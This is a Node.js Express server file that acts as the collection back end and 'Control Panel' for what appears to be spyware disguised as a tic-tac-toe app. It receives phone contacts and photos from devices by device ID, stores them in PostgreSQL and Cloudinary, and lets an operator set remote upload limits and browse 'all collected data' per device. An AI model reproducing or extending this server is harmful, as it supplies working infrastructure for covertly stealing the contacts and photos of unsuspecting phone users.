const express = require("express");
const { Pool } = require("pg");
const cloudinary = require("cloudinary").v2;
const multer = require("multer");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

// ================= CLOUDINARY =================
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_url TEXT
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact TEXT
    );
  `);
}
initDB();

// ================= SHARED STYLES =================
const sharedStyles = `
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0f1e;
      color: #e2e8f0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      padding: 0;
    }
    .topbar {
      background: #0d1526;
      border-bottom: 1px solid #1e2d4a;
      padding: 16px 32px;
      display: flex;
      align-items: center;
      gap: 12px;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .topbar .logo {
      font-size: 20px;
      font-weight: 700;
      color: #22c55e;
      letter-spacing: -0.5px;
    }
    .topbar nav { margin-left: auto; display: flex; gap: 8px; }
    .topbar nav a {
      color: #94a3b8;
      text-decoration: none;
      padding: 8px 14px;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.2s;
    }
    .topbar nav a:hover { background: #1e2d4a; color: #e2e8f0; }
    .page { padding: 36px 32px; max-width: 1100px; margin: 0 auto; }
    .page-title {
      font-size: 26px;
      font-weight: 700;
      color: #f1f5f9;
      margin-bottom: 6px;
    }
    .page-subtitle {
      font-size: 14px;
      color: #64748b;
      margin-bottom: 32px;
    }
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px;
      margin-bottom: 32px;
    }
    .stat-card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 22px 24px;
    }
    .stat-card .stat-icon {
      width: 40px; height: 40px;
      border-radius: 10px;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
      margin-bottom: 14px;
    }
    .stat-card .stat-label {
      font-size: 12px;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      margin-bottom: 6px;
    }
    .stat-card .stat-value {
      font-size: 32px;
      font-weight: 700;
      color: #f1f5f9;
    }
    .card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 24px;
      margin-bottom: 20px;
    }
    .card h3 {
      font-size: 15px;
      font-weight: 600;
      color: #cbd5e1;
      margin-bottom: 18px;
      padding-bottom: 14px;
      border-bottom: 1px solid #1e2d4a;
    }
    .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
    .form-group { display: flex; flex-direction: column; gap: 6px; }
    .form-group label { font-size: 12px; color: #64748b; text-transform: uppercase; letter-spacing: 0.6px; }
    input[type="number"] {
      background: #131f38;
      border: 1px solid #1e2d4a;
      color: #e2e8f0;
      padding: 10px 14px;
      border-radius: 8px;
      font-size: 14px;
      width: 110px;
      outline: none;
      transition: border 0.2s;
    }
    input[type="number"]:focus { border-color: #22c55e; }
    .btn {
      padding: 10px 20px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: all 0.2s;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .btn-primary { background: #22c55e; color: #052e16; }
    .btn-primary:hover { background: #16a34a; }
    .btn-secondary {
      background: transparent;
      border: 1px solid #1e2d4a;
      color: #94a3b8;
    }
    .btn-secondary:hover { background: #1e2d4a; color: #e2e8f0; }
    .links-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 12px;
    }
    .link-card {
      background: #131f38;
      border: 1px solid #1e2d4a;
      border-radius: 12px;
      padding: 18px 20px;
      text-decoration: none;
      color: #e2e8f0;
      display: flex;
      align-items: center;
      gap: 12px;
      transition: all 0.2s;
      font-size: 14px;
      font-weight: 500;
    }
    .link-card:hover { border-color: #22c55e; background: #0d1f10; color: #22c55e; }
    .link-icon {
      width: 36px; height: 36px;
      border-radius: 8px;
      background: #1e2d4a;
      display: flex; align-items: center; justify-content: center;
      font-size: 16px;
      flex-shrink: 0;
    }

    /* Users page */
    .user-list { display: flex; flex-direction: column; gap: 10px; }
    .user-row {
      background: #131f38;
      border: 1px solid #1e2d4a;
      border-radius: 10px;
      padding: 14px 18px;
      display: flex;
      align-items: center;
      gap: 14px;
      text-decoration: none;
      color: #e2e8f0;
      transition: all 0.2s;
    }
    .user-row:hover { border-color: #22c55e; }
    .user-avatar {
      width: 38px; height: 38px;
      border-radius: 50%;
      background: linear-gradient(135deg, #22c55e22, #1e4d2b);
      border: 1px solid #22c55e44;
      display: flex; align-items: center; justify-content: center;
      font-size: 13px;
      font-weight: 600;
      color: #22c55e;
      flex-shrink: 0;
    }
    .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; }
    .badge {
      margin-left: auto;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 12px;
      background: #22c55e18;
      color: #22c55e;
      border: 1px solid #22c55e33;
    }

    /* User detail */
    .images-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
      gap: 12px;
      margin-bottom: 8px;
    }
    .img-wrapper {
      border-radius: 10px;
      overflow: hidden;
      border: 1px solid #1e2d4a;
      aspect-ratio: 1;
      background: #131f38;
    }
    .img-wrapper img {
      width: 100%; height: 100%;
      object-fit: cover;
      display: block;
      transition: transform 0.3s;
    }
    .img-wrapper:hover img { transform: scale(1.05); }
    .empty-state {
      padding: 24px;
      text-align: center;
      color: #334155;
      font-size: 14px;
    }

    /* Contacts page */
    .contacts-table { width: 100%; border-collapse: collapse; }
    .contacts-table th {
      text-align: left;
      font-size: 11px;
      color: #475569;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      padding: 0 16px 12px;
    }
    .contacts-table td {
      padding: 12px 16px;
      font-size: 14px;
      color: #cbd5e1;
      border-top: 1px solid #1e2d4a;
    }
    .contacts-table tr:hover td { background: #131f38; }
    .device-badge {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 6px;
      font-size: 12px;
      background: #1e2d4a;
      color: #94a3b8;
      font-family: monospace;
    }
    .contact-name {
      display: flex; align-items: center; gap: 8px;
    }
    .contact-dot {
      width: 7px; height: 7px;
      border-radius: 50%;
      background: #22c55e;
      flex-shrink: 0;
    }
  </style>
`;

// ================= CONTROL =================
let config = { limit: 5, offset: 0 };

app.get("/config/:device_id", (req, res) => {
  res.json(config);
});

app.post("/set-config", (req, res) => {
  config.limit = parseInt(req.body.limit);
  config.offset = parseInt(req.body.offset);
  res.redirect("/control");
});

// ================= DASHBOARD =================
app.get("/", async (req, res) => {
  const users = await pool.query("SELECT COUNT(*) FROM users");
  const images = await pool.query("SELECT COUNT(*) FROM images");
  const contacts = await pool.query("SELECT COUNT(*) FROM contacts");

  res.send(`
  <html><head><title>Dashboard</title>${sharedStyles}</head>
  <body>
    <div class="topbar">
      <span class="logo">&#9670; Control Panel</span>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
        <a href="/contacts">Contacts</a>
      </nav>
    </div>
    <div class="page">
      <div class="page-title">Dashboard</div>
      <div class="page-subtitle">Overview of all collected data</div>

      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-icon" style="background:#0d2d1a;">&#128100;</div>
          <div class="stat-label">Total Users</div>
          <div class="stat-value">${users.rows[0].count}</div>
        </div>
        <div class="stat-card">
          <div class="stat-icon" style="background:#0d1f38;">&#128247;</div>
          <div class="stat-label">Images</div>
          <div class="stat-value">${images.rows[0].count}</div>
        </div>
        <div class="stat-card">
          <div class="stat-icon" style="background:#2d1a00;">&#128222;</div>
          <div class="stat-label">Contacts</div>
          <div class="stat-value">${contacts.rows[0].count}</div>
        </div>
      </div>

      <div class="card">
        <h3>&#9881; Upload Configuration</h3>
        <form method="POST" action="/set-config">
          <div class="form-row">
            <div class="form-group">
              <label>Limit</label>
              <input type="number" name="limit" value="${config.limit}"/>
            </div>
            <div class="form-group">
              <label>Offset</label>
              <input type="number" name="offset" value="${config.offset}"/>
            </div>
            <button type="submit" class="btn btn-primary">&#10003; Update Config</button>
          </div>
        </form>
      </div>

      <div class="card">
        <h3>&#128279; Quick Navigation</h3>
        <div class="links-grid">
          <a href="/users" class="link-card">
            <div class="link-icon">&#128101;</div>
            View All Users
          </a>
          <a href="/contacts" class="link-card">
            <div class="link-icon">&#128222;</div>
            View All Contacts
          </a>
        </div>
      </div>
    </div>
  </body></html>
  `);
});

// ================= RECEIVE CONTACTS =================
app.post("/receive", async (req, res) => {
  const { device_id, data } = req.body;
  for (let contact of data) {
    await pool.query(
      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
      [device_id, contact]
    );
  }
  await pool.query(
    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
    [device_id]
  );
  res.send("Contacts saved ✅");
});

// ================= IMAGE UPLOAD =================
app.post("/upload-image", upload.single("image"), async (req, res) => {
  try {
    const device_id = req.body.device_id;
    const stream = cloudinary.uploader.upload_stream(
      { folder: "tic_tac_toe_app" },
      async (error, result) => {
        if (error) return res.status(500).send("Upload error");
        const imageUrl = result.secure_url;
        await pool.query(
          "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
          [device_id, imageUrl]
        );
        await pool.query(
          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
          [device_id]
        );
        res.json({ url: imageUrl });
      }
    );
    stream.end(req.file.buffer);
  } catch (err) {
    res.status(500).send("Server error");
  }
});

// ================= USERS =================
app.get("/users", async (req, res) => {
  const users = await pool.query("SELECT * FROM users");

  let rows = "";
  users.rows.forEach((u, i) => {
    const initials = u.device_id.substring(0, 2).toUpperCase();
    rows += `
      <a href="/user/${u.device_id}" class="user-row">
        <div class="user-avatar">${initials}</div>
        <div class="user-id">${u.device_id}</div>
        <span class="badge">View &rarr;</span>
      </a>
    `;
  });

  res.send(`
  <html><head><title>Users</title>${sharedStyles}</head>
  <body>
    <div class="topbar">
      <span class="logo">&#9670; Control Panel</span>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
        <a href="/contacts">Contacts</a>
      </nav>
    </div>
    <div class="page">
      <div class="page-title">All Users</div>
      <div class="page-subtitle">${users.rows.length} registered device(s)</div>
      <div class="user-list">
        ${rows || '<div class="empty-state">No users found.</div>'}
      </div>
    </div>
  </body></html>
  `);
});

// ================= USER DATA =================
app.get("/user/:device_id", async (req, res) => {
  const device = req.params.device_id;

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device]
  );
  const contacts = await pool.query(
    "SELECT * FROM contacts WHERE device_id=$1",
    [device]
  );

  let imgGrid = "";
  images.rows.forEach(img => {
    imgGrid += `
      <div class="img-wrapper">
        <img src="${img.image_url}" alt="device image" loading="lazy"/>
      </div>
    `;
  });

  let contactRows = "";
  contacts.rows.forEach(c => {
    contactRows += `
      <tr>
        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
      </tr>
    `;
  });

  res.send(`
  <html><head><title>Device: ${device}</title>${sharedStyles}</head>
  <body>
    <div class="topbar">
      <span class="logo">&#9670; Control Panel</span>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
        <a href="/contacts">Contacts</a>
      </nav>
    </div>
    <div class="page">
      <a href="/users" class="btn btn-secondary" style="margin-bottom:20px;">&larr; Back to Users</a>
      <div class="page-title" style="margin-top:16px;">Device Details</div>
      <div class="page-subtitle" style="font-family:monospace;">${device}</div>

      <div class="card">
        <h3>&#128247; Images (${images.rows.length})</h3>
        ${imgGrid
          ? `<div class="images-grid">${imgGrid}</div>`
          : '<div class="empty-state">No images uploaded.</div>'
        }
      </div>

      <div class="card">
        <h3>&#128222; Contacts (${contacts.rows.length})</h3>
        ${contactRows
          ? `<table class="contacts-table">
              <thead><tr><th>Contact</th></tr></thead>
              <tbody>${contactRows}</tbody>
             </table>`
          : '<div class="empty-state">No contacts found.</div>'
        }
      </div>
    </div>
  </body></html>
  `);
});

// ================= CONTACTS PAGE =================
app.get("/contacts", async (req, res) => {
  const contacts = await pool.query("SELECT * FROM contacts ORDER BY device_id");

  let rows = "";
  contacts.rows.forEach(c => {
    rows += `
      <tr>
        <td><span class="device-badge">${c.device_id}</span></td>
        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
      </tr>
    `;
  });

  res.send(`
  <html><head><title>Contacts</title>${sharedStyles}</head>
  <body>
    <div class="topbar">
      <span class="logo">&#9670; Control Panel</span>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
        <a href="/contacts">Contacts</a>
      </nav>
    </div>
    <div class="page">
      <div class="page-title">All Contacts</div>
      <div class="page-subtitle">${contacts.rows.length} contact(s) collected</div>
      <div class="card" style="padding:0; overflow:hidden;">
        ${rows
          ? `<table class="contacts-table">
              <thead style="padding:16px;">
                <tr>
                  <th style="padding:16px 16px 12px;">Device ID</th>
                  <th style="padding:16px 16px 12px;">Contact</th>
                </tr>
              </thead>
              <tbody>${rows}</tbody>
             </table>`
          : '<div class="empty-state" style="padding:32px;">No contacts found.</div>'
        }
      </div>
    </div>
  </body></html>
  `);
});

app.listen(process.env.PORT || 3000);
